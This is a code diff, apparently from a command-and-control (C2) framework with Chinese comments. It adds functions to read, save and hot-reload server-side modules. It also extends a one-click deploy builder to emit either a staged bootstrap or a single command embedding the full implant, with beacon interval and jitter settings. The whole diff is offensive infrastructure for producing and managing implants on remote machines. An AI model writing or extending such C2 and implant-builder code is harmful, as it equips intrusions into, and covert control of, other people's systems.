@@ -418,6 +418,46 @@ def delete_module(filename: str):
         return True, f"模块 {filename} 已删除并热生效"
 
 
+def get_smodule(name: str):
+    """获取 server 端模块完整元数据(含 code 源码全文)。不存在返回 None。"""
+    server = get_c2()
+    if not server:
+        return None
+    with _C2_LOCK:
+        return server._dispatcher.smods.get_module(name)
+
+
+def save_smodule(name: str, content: str):
+    """保存 server 端模块源码到 s_modules/<name>.py 并热生效(每次运行
+    重新加载,改文件立即生效)。返回 (ok, message)。"""
+    server = get_c2()
+    if not server:
+        return False, "C2 未启动"
+    name = os.path.basename(str(name or "").strip())
+    if name.endswith(".py"):
+        name = name[:-3]
+    if not name or name in ("__init__", "server_module_loader"):
+        return False, "非法模块名"
+    if not content or not content.strip():
+        return False, "源码为空"
+    try:
+        compile(content, name + ".py", "exec")
+    except Exception as exc:
+        return False, f"源码编译失败: {exc}"
+    with _C2_LOCK:
+        smods = server._dispatcher.smods
+        d = str(getattr(smods, "_dir", ""))
+        if not d or not os.path.isdir(d):
+            return False, f"s_modules 目录不存在: {d}"
+        path = os.path.join(d, name + ".py")
+        try:
+            with open(path, "w", encoding="utf-8") as f:
+                f.write(content)
+        except OSError as exc:
+            return False, f"写入失败: {exc}"
+        return True, f"server 模块 {name}.py 已保存(运行即热生效)"
+
+
 def list_module_files() -> list:
     """列出模块目录下的全部模块文件（删除管理用，返回文件名）。"""
     server = get_c2()
@@ -736,8 +776,13 @@ def task_list(client_id: str, limit: int = 50) -> list:
         return _task_list_unlocked(server, client_id, limit)
 
 
-def build_deploy(host: str, port: int, interval: int = 60, jitter: float = 0.2) -> dict:
-    """一键部署生成:调 build server 模块,返回 {ok, deploy, key_fp, note}。"""
+def build_deploy(host: str, port: int, interval: int = 60, jitter: float = 0.2,
+                 single: bool = False) -> dict:
+    """一键部署生成:调 build server 模块,返回 {ok, deploy, key_fp, note}。
+
+    single=True → 单段(一条命令内嵌完整植入物,不设二阶段);
+    默认分段(第一段引导 + stage_code 第二段首连下发)。
+    """
     server = get_c2()
     if not server:
         return {"ok": False, "error": _C2_INIT_ERROR or "C2 未启动"}
@@ -747,7 +792,8 @@ def build_deploy(host: str, port: int, interval: int = 60, jitter: float = 0.2) 
             # 会把 dict JSON 序列化成文本,deploy 段还被移出,结构化消费方
             # 无法还原——2026-09-04 修复)
             res = server._smods.run_structured(
-                "build", [str(host), str(port), "", str(interval), str(jitter), ""])
+                "build", [str(host), str(port), "", str(interval), str(jitter),
+                          "", "1" if single else ""])
         except Exception as exc:
             return {"ok": False, "error": str(exc)}
     if not isinstance(res, dict) or res.get("status") != "ok":
